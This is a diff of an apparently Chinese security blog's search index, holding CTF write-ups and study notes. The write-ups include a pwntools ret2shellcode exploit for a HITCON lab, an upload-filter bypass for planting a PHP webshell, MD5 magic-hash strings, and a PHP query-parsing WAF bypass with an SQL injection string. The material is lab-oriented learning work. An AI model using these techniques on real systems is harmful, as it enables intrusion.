@@ -38,7 +38,9 @@ lab1可以说基本上没有用到Pwn，只是简单的逆向，了解ida、gdb�
 
 file 一下 ret2lib ，返回32位
 
-用ida打开文件分析一下</code></pre><p><img src="https://i.loli.net/2019/04/24/5cc068d80b6c5.png" alt></p>
+用ida打开文件分析一下</code></pre><a id="more"></a>
+
+<p><img src="https://i.loli.net/2019/04/24/5cc068d80b6c5.png" alt></p>
 <pre><code>这里两个地方值得注意：
     1、see_something()这个函数可以将你输入的地址找到其在运行中的真实地址
 
@@ -101,11 +103,31 @@ io.interactive()</code></pre><p><img src="https://i.loli.net/2019/04/24/5cc06c3c
       </tags>
   </entry>
   <entry>
+    <title>Mysql函数用法</title>
+    <url>/2019/07/25/Mysql%E5%87%BD%E6%95%B0%E7%94%A8%E6%B3%95/</url>
+    <content><![CDATA[<ol>
+<li>count()：汇总数据函数</li>
+<li>rand()：随机输出一个小于1的正数</li>
+<li>floor()：把输出的结果取整</li>
+<li>group by语句：把结果分组输出</li>
+<li>concat()：连接两条语句</li>
+</ol>
+]]></content>
+      <categories>
+        <category>数据库学习</category>
+      </categories>
+      <tags>
+        <tag>Mysql</tag>
+        <tag>函数用法</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>bugku 备份文件 wirteup</title>
     <url>/2018/11/26/bugku%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6wirteup/</url>
     <content><![CDATA[<p>备份文件一般情况是在后缀名后加的<em>.swp，</em>.bak</p>
 <p>利用==比较漏洞</p>
 <p>md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)</p>
+<a id="more"></a>
 <p>如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。</p>
 <p>下列的字符串的MD5值都是0e开头的：</p>
 <p>QNKCDZO</p>
@@ -114,6 +136,23 @@ io.interactive()</code></pre><p><img src="https://i.loli.net/2019/04/24/5cc06c3c
 <p>s155964671a</p>
 <p>s214587387a</p>
 <p>s214587387a</p>
+]]></content>
+      <categories>
+        <category>CTF学习</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>ctf学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>bugku 文件上传 wirteup</title>
+    <url>/2018/11/28/bugku%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0wirteup/</url>
+    <content><![CDATA[<p><img src="/2018/11/28/bugku%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0wirteup/0rn6779r.bmp" alt><br>/很显然只允许上传图片格式，不允许上传PHP脚本，但是我们就是要上传一句话木马！<br>提交之后抓包</p>
+<a id="more"></a>
+
+<p>这道题是后缀名黑名单检测和类型检测<br>        1. 把请求头里面的Content-Type字母改成大写进行绕过<br>        2. .jpg后面加上.php5其他的都被过滤了好像<br> 如果是walf严格匹配，通过修改Content-type后字母的大小写可以绕过检测，使得需要上传的文件可以到达服务器端，而服务器的容错率较高，一般我们上传的文件可以解析。然后就需要确定我们如何上传文件，在分别将后缀名修改为php2, php3, php4, php5, phps, pht, phtm, phtml（php的别名），发现只有php5没有被过滤，成功上传，得到flag</p>
+<p>要修改三个地方：<br>1、扩展名filename<br>2、filename下面一行的Content-Type:image/jpeg<br>3、最最最重要的是请求头里的Content-Type字段，进行大小写绕过，也就是把multipart/form-data中任意一个字母改成大写即可<br> <img src="/2018/11/28/bugku%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0wirteup/c2zulbcl.bmp" alt></p>
 ]]></content>
       <categories>
         <category>CTF学习</category>
@@ -158,44 +197,67 @@ if (isset($_GET['uname']) and isset($_POST['passwd'])) {
       </tags>
   </entry>
   <entry>
-    <title>Mysql函数用法</title>
-    <url>/2019/07/25/Mysql%E5%87%BD%E6%95%B0%E7%94%A8%E6%B3%95/</url>
-    <content><![CDATA[<ol>
-<li>count()：汇总数据函数</li>
-<li>rand()：随机输出一个小于1的正数</li>
-<li>floor()：把输出的结果取整</li>
-<li>group by语句：把结果分组输出</li>
-<li>concat()：连接两条语句</li>
-</ol>
-]]></content>
+    <title>hitcon  lab3 </title>
+    <url>/2019/04/18/hitcon-lab3/</url>
+    <content><![CDATA[<p>lab3这道题是一个基本的栈溢出</p>
+<pre><code>先用ida分析ret2sc文件</code></pre><p><img src="https://i.loli.net/2019/04/18/5cb87b3a035c1.png" alt></p>
+<pre><code>程序显示先是read &quot;&amp;name&quot;，然后溢出v4的缓冲区，
+
+由此我们可以将shellcode跳转到name的地址去执行，然后得到shel，这是基本思路
+
+首先看一下&amp;name的地址，双击&amp;name可以看到</code></pre><a id="more"></a>
+
+<p><img src="https://i.loli.net/2019/04/18/5cb87ddce5128.png" alt></p>
+<pre><code>地址为0x0804A060
+
+直接上exp：
+
+from pwn import *
+
+&apos;&apos;&apos;A)AA found at offset: 32&apos;&apos;&apos;
+
+context.log_level = &apos;debug&apos;
+
+io = process(&apos;ret2sc&apos;)
+
+sc = asm(shellcraft.sh())
+
+ret2 = &apos;A&apos;*32 + p32(0x0804A060)
+
+io.sendafter(&apos;Name:&apos;,sc)
+
+io.sendafter(&apos;best:&apos;,ret2)
+
+io.interactive()
+
+直接运行  </code></pre><p><img src="https://i.loli.net/2019/04/18/5cb87f55ab5e5.png" alt></p>
+<pre><code>ok，拿到shell，直接cat flag就行了</code></pre>]]></content>
       <categories>
-        <category>数据库学习</category>
+        <category>逆向学习</category>
       </categories>
       <tags>
-        <tag>Mysql</tag>
-        <tag>函数用法</tag>
+        <tag>Hitcon</tag>
       </tags>
   </entry>
   <entry>
-    <title>bugku 文件上传 wirteup</title>
-    <url>/2018/11/28/bugku%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0wirteup/</url>
-    <content><![CDATA[<p><img src="/2018/11/28/bugku%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0wirteup/0rn6779r.bmp" alt><br>/很显然只允许上传图片格式，不允许上传PHP脚本，但是我们就是要上传一句话木马！<br>提交之后抓包</p>
-<p>这道题是后缀名黑名单检测和类型检测<br>        1. 把请求头里面的Content-Type字母改成大写进行绕过<br>        2. .jpg后面加上.php5其他的都被过滤了好像<br> 如果是walf严格匹配，通过修改Content-type后字母的大小写可以绕过检测，使得需要上传的文件可以到达服务器端，而服务器的容错率较高，一般我们上传的文件可以解析。然后就需要确定我们如何上传文件，在分别将后缀名修改为php2, php3, php4, php5, phps, pht, phtm, phtml（php的别名），发现只有php5没有被过滤，成功上传，得到flag</p>
-<p>要修改三个地方：<br>1、扩展名filename<br>2、filename下面一行的Content-Type:image/jpeg<br>3、最最最重要的是请求头里的Content-Type字段，进行大小写绕过，也就是把multipart/form-data中任意一个字母改成大写即可<br> <img src="/2018/11/28/bugku%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0wirteup/c2zulbcl.bmp" alt></p>
+    <title>buuctf web easy calc wirteup</title>
+    <url>/2020/04/02/buuctf-web-easy-calc-wirteup/</url>
+    <content><![CDATA[<p>此题考查php文件解析漏洞</p>
+<p>我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。<br>例如：/?foo=bar变成Array([foo] =&gt; “bar”)。<br>值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。</p>
+<a id="more"></a>
+<p>例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。<br>如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p>
+<p>/news.php?%20news[id%00=42”+AND+1=0–</p>
+<p>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。</p>
+<p>HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：<br>        1.删除空白符<br>        2.将某些字符转换为下划线（包括空格）</p>
 ]]></content>
-      <categories>
-        <category>CTF学习</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-        <tag>ctf学习</tag>
-      </tags>
   </entry>
   <entry>
     <title>calc2</title>
     <url>/2019/04/19/calc2/</url>
     <content><![CDATA[<p>今天做了一个web题，emmmm，以前没有遇到过，涨姿势。。。</p>
 <pre><code>http://139.224.220.67:30008，这个是六星战队的一个ctf联系平台</code></pre><p><img src="https://i.loli.net/2019/04/19/5cb999e4ed8ea.png" alt></p>
+<a id="more"></a>
+
 <pre><code>首先是 shell_exec（） 这个函数，百度查了一下，命令执行，emmm</code></pre><p><img src="https://i.loli.net/2019/04/19/5cb99b6feb0c6.png" alt></p>
 <pre><code>首先是将输入的 &amp;str 传入 bc 再通过shell_exec() 执行，再echo回显出来</code></pre><p><img src="https://i.loli.net/2019/04/19/5cb99ce305a30.png" alt></p>
 <pre><code>ls一下看到了当前文件夹下的文件，flag就在里面
@@ -238,16 +300,6 @@ if(strpos($str,&quot;flag&quot;)!==false)
       </tags>
   </entry>
   <entry>
-    <title>buuctf web easy calc wirteup</title>
-    <url>/2020/04/02/buuctf-web-easy-calc-wirteup/</url>
-    <content><![CDATA[<p>此题考查php文件解析漏洞</p>
-<p>我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。<br>例如：/?foo=bar变成Array([foo] =&gt; “bar”)。<br>值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。<br>例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。<br>如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p>
-<p>/news.php?%20news[id%00=42”+AND+1=0–</p>
-<p>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。</p>
-<p>HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：<br>        1.删除空白符<br>        2.将某些字符转换为下划线（包括空格）</p>
-]]></content>
-  </entry>
-  <entry>
     <title>i春秋 sqli wirteup</title>
     <url>/2018/12/12/i%E6%98%A5%E7%A7%8B-sqli-wirteup/</url>
     <content><![CDATA[<p>sql注入时，逗号被过滤后可用payload</p>
@@ -265,52 +317,11 @@ if(strpos($str,&quot;flag&quot;)!==false)
       </tags>
   </entry>
   <entry>
-    <title>hitcon  lab3 </title>
-    <url>/2019/04/18/hitcon-lab3/</url>
-    <content><![CDATA[<p>lab3这道题是一个基本的栈溢出</p>
-<pre><code>先用ida分析ret2sc文件</code></pre><p><img src="https://i.loli.net/2019/04/18/5cb87b3a035c1.png" alt></p>
-<pre><code>程序显示先是read &quot;&amp;name&quot;，然后溢出v4的缓冲区，
-
-由此我们可以将shellcode跳转到name的地址去执行，然后得到shel，这是基本思路
-
-首先看一下&amp;name的地址，双击&amp;name可以看到</code></pre><p><img src="https://i.loli.net/2019/04/18/5cb87ddce5128.png" alt></p>
-<pre><code>地址为0x0804A060
-
-直接上exp：
-
-from pwn import *
-
-&apos;&apos;&apos;A)AA found at offset: 32&apos;&apos;&apos;
-
-context.log_level = &apos;debug&apos;
-
-io = process(&apos;ret2sc&apos;)
-
-sc = asm(shellcraft.sh())
-
-ret2 = &apos;A&apos;*32 + p32(0x0804A060)
-
-io.sendafter(&apos;Name:&apos;,sc)
-
-io.sendafter(&apos;best:&apos;,ret2)
-
-io.interactive()
-
-直接运行  </code></pre><p><img src="https://i.loli.net/2019/04/18/5cb87f55ab5e5.png" alt></p>
-<pre><code>ok，拿到shell，直接cat flag就行了</code></pre>]]></content>
-      <categories>
-        <category>逆向学习</category>
-      </categories>
-      <tags>
-        <tag>Hitcon</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>i春秋 模拟上传 wirteup</title>
     <url>/2018/12/02/i%E6%98%A5%E7%A7%8B%E6%A8%A1%E6%8B%9F%E4%B8%8A%E4%BC%A0wirteup/</url>
     <content><![CDATA[<p>网址    <a href="http://106.75.72.168:2222/" target="_blank" rel="noopener">http://106.75.72.168:2222/</a></p>
 <p>Sorry. You have no permissions.</p>
-<p>既然没有提示，也没有其他的链接，那么可能有以下几种可能：<br>       1、敏感文件泄漏<br>       2、跳转<br>       3、cookie / session<br>       第一个想法在经过扫描器扫描之后就放弃了，因为只看到index.php，还有/upload/，但是在访问的时候是403<br>       第二个在抓包的时候也没有看到有跳转<br>       只剩下第三个</p>
+<p>既然没有提示，也没有其他的链接，那么可能有以下几种可能：<br>       1、敏感文件泄漏<br>       2、跳转<br>       <a id="more"></a><br>       3、cookie / session<br>       第一个想法在经过扫描器扫描之后就放弃了，因为只看到index.php，还有/upload/，但是在访问的时候是403<br>       第二个在抓包的时候也没有看到有跳转<br>       只剩下第三个</p>
 <p>抓包发现cookie    Cookie: role=Zjo1OiJ0aHJmZyI7”</p>
 <p>base64解码后   “ f:5:”thrfg”; 初步判断为rot13 thrfg为guest<br>将其改为base64(rot13(admin))</p>
 <!-- $filename = $_POST['filename']; $data = $_POST['data']; -->
@@ -342,19 +353,6 @@ io.interactive()
       </tags>
   </entry>
   <entry>
-    <title>python库</title>
-    <url>/2019/07/25/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<p>import  random</p>
-<h1><span id="随机整数print-randomrandint150">随机整数：print random.randint(1,50)</span></h1><h1><span id="随机选取0到100间的奇偶数print-randomrandrange0-101-12">随机选取0到100间的(奇)偶数：print random.randrange(0, 101, （1）2)</span></h1><h1><span id="随机浮点数print-randomrandom-无范围-print-randomuniform1-10-有范围">随机浮点数：print random.random() 无范围 ；print random.uniform(1, 10) 有范围</span></h1><h1><span id="随机字符print-randomchoiceabcdefghijklmnopqrstuvwxyzamp">随机字符：print random.choice(‘abcdefghijklmnopqrstuvwxyz!@#$%^&amp;*()’)</span></h1><h1><span id="多个字符中生成指定数量的随机字符print-randomsamplezyxwvutsrqponmlkjihgfedcba5">多个字符中生成指定数量的随机字符：print random.sample(‘zyxwvutsrqponmlkjihgfedcba’,5)</span></h1><h1><span id="从a-za-z0-9生成指定数量的随机字符ran_str-joinrandomsamplestringascii_letters-stringdigits-8-print-ran_str">从a-zA-Z0-9生成指定数量的随机字符：ran_str = ‘’.join(random.sample(string.ascii_letters + string.digits, 8))  print ran_str</span></h1><h1><span id="多个字符中选取指定数量的字符组成新字符串print-joinrandomsamplezyxwvutsrqponmlkjihgfedcba-5">多个字符中选取指定数量的字符组成新字符串：print ‘’.join(random.sample([‘z’,’y’,’x’,’w’,’v’,’u’,’t’,’s’,’r’,’q’,’p’,’o’,’n’,’m’,’l’,’k’,’j’,’i’,’h’,’g’,’f’,’e’,’d’,’c’,’b’,’a’], 5))</span></h1><h1><span id="随机选取字符串print-randomchoice剪刀-石头-布">随机选取字符串：print random.choice([‘剪刀’, ‘石头’, ‘布’])</span></h1><h1><span id="打乱排序items-1-2-3-4-5-6-7-8-9-0-print-randomshuffleitems">打乱排序items = [1, 2, 3, 4, 5, 6, 7, 8, 9, 0]   print random.shuffle(items)</span></h1>]]></content>
-      <categories>
-        <category>编程</category>
-        <category>Python</category>
-      </categories>
-      <tags>
-        <tag>python</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>php函数学习</title>
     <url>/2019/09/25/php%E5%87%BD%E6%95%B0%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<p>var_dump()<br>用于输出变量的相关信息。 显示关于一个或多个表达式的结构信息，包括表达式的类型与值。</p>
@@ -367,6 +365,21 @@ io.interactive()
       </categories>
       <tags>
         <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>python库</title>
+    <url>/2019/07/25/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<p>import  random<br>随机整数：print random.randint(1,50)<br>随机选取0到100间的(奇)偶数：print random.randrange(0, 101, （1）2)<br>随机浮点数：print random.random() 无范围 ；print random.uniform(1, 10) 有范围</p>
+<a id="more"></a>
+<p>随机字符：print random.choice(‘abcdefghijklmnopqrstuvwxyz!@#$%^&amp;*()’)<br>多个字符中生成指定数量的随机字符：print random.sample(‘zyxwvutsrqponmlkjihgfedcba’,5)<br>从a-zA-Z0-9生成指定数量的随机字符：ran_str = ‘’.join(random.sample(string.ascii_letters + string.digits, 8))  print ran_str<br>多个字符中选取指定数量的字符组成新字符串：print ‘’.join(random.sample([‘z’,’y’,’x’,’w’,’v’,’u’,’t’,’s’,’r’,’q’,’p’,’o’,’n’,’m’,’l’,’k’,’j’,’i’,’h’,’g’,’f’,’e’,’d’,’c’,’b’,’a’], 5))<br>随机选取字符串：print random.choice([‘剪刀’, ‘石头’, ‘布’])<br>打乱排序items = [1, 2, 3, 4, 5, 6, 7, 8, 9, 0]   print random.shuffle(items)</p>
+]]></content>
+      <categories>
+        <category>编程</category>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
       </tags>
   </entry>
   <entry>
